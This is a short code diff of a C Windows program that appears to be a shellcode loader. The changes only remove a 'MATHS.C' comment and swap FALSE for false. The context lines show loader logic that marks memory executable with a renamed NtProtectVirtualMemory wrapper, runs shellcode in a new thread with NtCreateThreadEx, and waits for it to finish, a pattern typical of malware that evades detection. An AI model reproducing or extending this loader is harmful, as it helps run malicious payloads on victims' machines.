@@ -1,12 +1,6 @@
 #include "definitions.h"
 
 
-// MATHS.C
-
-
-
-
-
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
 
     char path[MAX_PATH]; 
@@ -84,10 +78,10 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     _NtProtectVirtMem((HANDLE)-1, &exec, &regionSize, PAGE_EXECUTE_READ, &old_protect);
 
     // Executing shellcode in a new thread
-    _NtCreateThreadEx(&th, GENERIC_ALL, NULL, (HANDLE)-1, exec, NULL, FALSE, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);
+    _NtCreateThreadEx(&th, GENERIC_ALL, NULL, (HANDLE)-1, exec, NULL, false, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);
 
     // Waiting for thread to finish
-    _NtWaitForSingleObj(th, FALSE, NULL);
+    _NtWaitForSingleObj(th, false, NULL);
 
     return 0;
 }
